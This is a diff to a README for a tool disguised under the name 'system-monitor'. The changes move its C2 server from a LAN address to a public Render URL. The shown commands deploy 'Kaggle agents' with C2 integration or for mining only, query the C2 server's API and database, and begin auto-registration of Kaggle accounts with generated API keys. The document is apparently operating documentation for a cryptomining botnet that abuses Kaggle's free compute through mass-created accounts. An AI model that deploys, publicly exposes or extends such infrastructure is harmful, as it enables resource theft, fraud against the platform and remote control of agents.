@@ -11,9 +11,11 @@
 
 ## 🌐 ACCESS POINTS
 
-### Local Access
+### Public Access (Render)
+- **URL:** https://system-monitor-6dru.onrender.com
+
+### Local Access (Development)
 - **URL:** http://localhost:5000
-- **LAN:** http://192.168.0.171:5000
 
 ### Login Credentials
 - **Username:** admin
@@ -42,17 +44,17 @@
 
 ### 1. Access Dashboard
 ```bash
-# Local browser
-firefox http://localhost:5000
+# Public URL
+firefox https://system-monitor-6dru.onrender.com
 
-# Or from LAN
-firefox http://192.168.0.171:5000
+# Or local development
+firefox http://localhost:5000
 ```
 
 ### 2. Deploy Kaggle Agents
 ```bash
 # With C2 integration
-python3 kaggle/deploy_unified.py --c2-url http://192.168.0.171:5000 --count 5
+python3 kaggle/deploy_unified.py --c2-url https://system-monitor-6dru.onrender.com --count 5
 
 # Mining only
 python3 kaggle/deploy_unified.py --count 5
@@ -61,10 +63,10 @@ python3 kaggle/deploy_unified.py --count 5
 ### 3. Check Server Status
 ```bash
 # API health check
-curl http://localhost:5000/api/health
+curl https://system-monitor-6dru.onrender.com/api/health
 
 # Server stats
-curl http://localhost:5000/api/stats
+curl https://system-monitor-6dru.onrender.com/api/stats
 
 # View logs
 tail -f logs/unified.log
@@ -125,7 +127,7 @@ sqlite3 data/c2.db "SELECT * FROM logs ORDER BY ts DESC LIMIT 10;"
 ## 🎯 NEXT STEPS
 
 ### 1. Configure Kaggle Accounts
-- Go to http://localhost:5000/autoreg
+- Go to https://system-monitor-6dru.onrender.com/autoreg
 - Start auto-registration for Kaggle
 - Generate API keys for accounts
 
